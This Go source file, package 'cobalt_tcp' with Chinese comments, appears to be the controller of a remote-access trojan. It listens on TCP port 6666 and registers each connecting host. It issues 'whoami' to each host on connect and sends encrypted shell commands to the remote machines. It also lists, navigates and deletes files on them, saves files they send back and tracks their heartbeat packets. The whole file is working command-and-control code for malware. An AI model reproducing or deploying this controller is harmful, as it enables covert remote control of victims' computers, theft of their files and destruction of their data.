package cobalt_tcp

import (
	cobalt_crypto "My-Comment/cobalt.crypto"
	"bufio"
	"bytes"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"log"
	"net"
	"os"
	"regexp"
	"runtime"
	"strings"
	"time"
)

var DEBUG bool = true
var Computer = runtime.GOOS //
var MaxConnect = 30         // 定义最大连接数量
var MaxChanSize = 10        //默认每个命令通道的大小
var MaxMagString = 5000     //默认每次接受命令的大小

type HOSTS struct {
	Ip        string
	chans     chan string
	Time      string
	Living    string
	chansBack chan string
	Whoami    string
	file      string
}

func MyListen() (net.Listener, error) {
	return net.Listen("tcp", ":6666")
}
func (hosts *HOSTS) UseCmd() {
	var b string
	reader := bufio.NewReader(os.Stdin) // 确保得到空行

	fmt.Printf("使用quit退出\n")
	if Computer == "windows" {
		fmt.Scanf("%s", &b)
	}

	for {
		fmt.Printf(">")
		a, _ := reader.ReadString('\n')
		if a == "quit\r\n" {
			break
		}
		if DEBUG {
			fmt.Printf("user cmd :%s\n", a)
		}

		hosts.chans <- "Cmd\r\n" + a
		//b = <-hosts.chansBack
		//fmt.Printf("\n%s", b)
	}
}
func (hosts *HOSTS) SetCmd(string2 string) {
	cmd := "Cmd\r\n" + string2
	hosts.chans <- cmd
	//backs := <-hosts.chansBack
	fmt.Printf("\n")
	//fmt.Printf("%s", backs)
}
func (_ HOSTS) Listener(listener net.Listener, ipchan map[int]HOSTS) {

	for {

		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		// 检测地址是否被保存过
		// 检测该端口是否存在过，如果不存在，就标记并传入通道，反之就创建通道，记录并传入
		ip_temp := conn.RemoteAddr().String()
		reg := regexp.MustCompile(`\d*\.\d*\.\d*\.\d`)
		ip := reg.FindString(ip_temp)
		cmd := addip(ip, ipchan)
		//_ = conn.SetReadDeadline(Time.Time{}.Add(Time.Second * 60))
		go PutMsgs(conn, cmd) //复制传输，所以传输后conn的值改变也无妨
		if DEBUG {
			fmt.Printf("启动传输协程完成")
		}

	}
}
func (hosts *HOSTS) Getpoint() *HOSTS {
	return hosts
}
func PutMsgs(conn net.Conn, cmd *HOSTS) {
	// 用于向客户端发送请求的函数
	regstringCmd := "\\ACmd\\r\\n"
	regCmd := regexp.MustCompile(regstringCmd)
	regstring := "\\ADocument"
	reg := regexp.MustCompile(regstring)
	go cmd.GetMsg(conn) //启动接受消息协程
	if DEBUG {
		fmt.Printf("启动接受协程完成")
	}
	for {
		Sends := ""
		Sends = <-cmd.chans
		if DEBUG {
			//fmt.Printf("PUT")
		}

		if regCmd.FindString(Sends) == "Cmd\r\n" {
			//defer conn.Close()
			if DEBUG {
				fmt.Printf("Cmd ： %s\n", []byte(Sends))
			}
			b, err1 := cobalt_crypto.Encode([]byte(Sends))
			if err1 != nil {
				fmt.Printf("cmd加密失败")
				log.Println(err1)
			}
			n1, err := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}

			cmd.Time = time.Now().Format("01-02 15:04:05")
		} else if reg.FindString(Sends) == "Document" {
			if DEBUG {
				fmt.Printf("原文：%s\n", Sends)
			}
			file := Sends[8:]
			if DEBUG {
				fmt.Printf("发送内容：%s\n", file)
			}
			b, err1 := cobalt_crypto.Encode([]byte(file))
			if err1 != nil {
				fmt.Printf("document加密失败")
				log.Println(err1)
			}
			n1, err := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置S
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}

			cmd.Time = time.Now().Format("01-02 15:04:05")

		}
	}

}

func addip(ip string, ipChanMap map[int]HOSTS) *HOSTS {
	var host *HOSTS
	i := 0
	lens := len(ipChanMap)
	for i < lens {

		if ipChanMap[i].Ip == ip {
			hostTme := ipChanMap[i]
			host = &hostTme
			return host
		}
		i++
	}

	if i == lens {
		Chans := make(chan string, MaxChanSize)
		chansBack := make(chan string, MaxChanSize)
		Chans <- "Cmd\r\nwhoami"
		temp_host := HOSTS{
			ip,
			Chans,
			time.Now().Format("01-02 15:04:05"),
			"60",
			chansBack,
			"",
			"",
		}
		ipChanMap[i] = temp_host
		hostTme := ipChanMap[i]
		host = &hostTme
	}

	return host

}

func (hosts *HOSTS) PrintHost(i int) {
	fmt.Printf("%d\t%s\t\t%s\t\t\t%s\t%s\n", i+1, hosts.Ip, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
}

func (hosts *HOSTS) FileDeal() {
	var (
		relativePath string
		abslsentPath = ""
		Type         = ""
		temp         = ""
	)

	reg := regexp.MustCompile("(.*/)")
	hosts.chans <- "DocumentDocument\r\n"
	if DEBUG {
		fmt.Printf("DocumentDocument\r\n")
	}

	//fmt.Printf("%s", <-hosts.chansBack)
	if Computer == "windows" {
		fmt.Scanf("%s", temp)
	}
	for {
		fmt.Printf("%s>", abslsentPath)
		_, err := fmt.Scanf("%s %s\n", &Type, &relativePath)
		if err != nil && err.Error() != "unexpected newline" {
			fmt.Printf("输入错误6\n")
			log.Println(err)
		}
		if DEBUG {
			fmt.Printf("Type : %s\nPath: %s\n"+
				"", Type, relativePath)
		}

		switch Type {
		case "dir":
			if abslsentPath != "" {
				hosts.chans <- "Documentdir " + abslsentPath
			}
		case "cd":
			if relativePath == ".." {
				if strings.Index(abslsentPath, "/") == -1 {
					if DEBUG {
						fmt.Printf("未找到/\n")
					}
					hosts.chans <- "DocumentDocument\r\n"
					abslsentPath = "" //默认没有/的时候就清空
					continue
				}
				abslsentPath = reg.FindString(abslsentPath) //如果最后一个是“/”就需要去掉
				if abslsentPath[len(abslsentPath)-1:] == "/" {
					abslsentPath = abslsentPath[:len(abslsentPath)-1]
				}

			} else if abslsentPath == "" {
				abslsentPath = relativePath
			} else if relativePath == "" {
				hosts.chans <- "DocumentDocument\r\n"
				abslsentPath = ""
				relativePath = ""
				continue
			} else {
				abslsentPath = abslsentPath + "/" + relativePath
			}
			path := "Documentcd " + abslsentPath
			if DEBUG {
				fmt.Printf("path:%s\n", path)
			}
			hosts.chans <- path
		case "get":
		case "del":
			hosts.chans <- "Documentdel " + abslsentPath + relativePath
		case "quit":
			hosts.chans <- "Documentquit"
			return
		default:
			fmt.Printf("help\n")
			//help
		}
	}

}

func (hosts *HOSTS) GetMsg(conn net.Conn) {
	regstring := "\\ADocument\\r\\n"
	reg := regexp.MustCompile(regstring)
	GetMsg := make([]byte, MaxMagString*4)
	n, err := conn.Read(GetMsg)
	if err != nil {
		// 信息发送失败报错位置
		fmt.Printf("接受whoami错误3\n")
		log.Println(err)

	}
	if DEBUG {
		fmt.Printf("打印接受的whoami：%s\n", string(GetMsg[:n]))
	}
	// 解码位置
	hosts.Whoami, _ = cobalt_crypto.Decode(GetMsg[:n])
	if DEBUG {
		fmt.Printf("打印赋值的whoami: %s\n", hosts.Whoami)
	}
	if DEBUG {
		fmt.Printf("whoami: %s\n", GetMsg)
	}
	for {
		//fmt.Printf("GET")
		n1, err1 := conn.Read(GetMsg)
		if err1 != nil {
			fmt.Printf("接受错误4\n")
			log.Println(err1)
			return
		}

		//b, err2 := SocketToUtf8(GetMsg[:n1])
		b, err2 := cobalt_crypto.Decode(GetMsg[:n1]) // 解码位置
		if err2 != nil {
			fmt.Printf("转换失败：\n")
			log.Println(err2)
		}

		if b == "Alive" {
			if DEBUG {
				fmt.Printf("收到心跳包")
			}
			hosts.Time = time.Now().Format("01-02 15:04:05")
		} else if reg.FindString(b) == "Document\r\n" {
			file := b[10:]
			//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader([]byte(file)), simplifiedchinese.GBK.NewEncoder()))
			ioutil.WriteFile(hosts.file, []byte(file), 0664)
			fmt.Printf("\n文件保存完成\n")
			hosts.Time = time.Now().Format("01-02 15:04:05")
		} else {
			if DEBUG {
				fmt.Printf("收到消息\n")
			}
			//加密位置
			//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader(GetMsg), simplifiedchinese.GBK.NewEncoder()))
			//dd := []rune(b)

			fmt.Printf("%s", GetMsg)

			fmt.Printf("\n")
			if DEBUG {
				fmt.Printf("data 打印完毕")
			}
			hosts.Time = time.Now().Format("01-02 15:04:05")
		}

	}
}
func (hosts *HOSTS) Fileput() {
	fmt.Printf("fileput")
}
func SocketToUtf8(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}
